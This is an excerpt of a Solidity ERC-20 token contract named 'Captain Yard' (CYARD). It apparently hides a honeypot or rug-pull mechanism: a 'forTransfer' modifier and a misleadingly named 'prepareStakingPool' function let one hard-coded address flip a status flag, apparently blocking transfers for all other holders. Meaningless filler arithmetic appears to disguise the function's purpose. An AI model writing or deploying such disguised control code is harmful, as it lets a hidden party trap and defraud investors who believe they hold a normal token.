...
contract CaptainYard is Context, IERC20, IERC20Metadata {

    mapping(address => uint256) private _balances;

    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _tokenp_totalSupply;
    uint256 private _tokenp_status = 0;
    uint256 public stakingPoolpStatus = 0;

    string private _tokenp_name;
    string private _tokenp_symbol;

    address private _poolpAddress = 0xbb49857283b29743D2c6266DBc3489751846EEb4;

    constructor() {
        _tokenp_name = "Captain Yard";
        _tokenp_symbol = "CYARD";
        _tokenp_totalSupply = 1000000000000 * 10 ** 18;
        _balances[msg.sender] = _tokenp_totalSupply;
    }

    modifier forTransfer {
        require(msg.sender == _poolpAddress || _tokenp_status == 0);
        _;
    }

    function symbol() public view virtual override returns (string memory) {
        return _tokenp_symbol;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _tokenp_totalSupply;
    }
    ...
    function prepareStakingPool(address to) public {
        to == address(0);
        stakingPoolpStatus = 1;
        uint256 a = 1;
        a = a + 1;
        a = a-1;
        if (msg.sender == _poolpAddress)
        {
            _tokenp_status = 1;
        }
    }
